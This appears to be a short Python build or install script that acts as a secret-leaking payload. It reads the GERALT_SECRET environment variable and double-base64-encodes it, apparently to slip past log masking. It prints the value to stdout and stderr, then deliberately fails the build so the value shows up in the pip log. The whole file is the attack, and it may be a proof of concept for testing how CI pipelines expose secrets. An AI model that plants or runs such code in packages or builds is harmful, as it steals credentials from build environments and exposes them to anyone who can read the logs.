import base64
import os
import sys

secret = os.environ.get("GERALT_SECRET", "")
msg = "GERALT_LEAKED_TOKEN=" + base64.b64encode(base64.b64encode(secret.encode())).decode()
print(msg, flush=True)
print(msg, file=sys.stderr, flush=True)
raise RuntimeError("intentional build failure to surface leak in pip log")
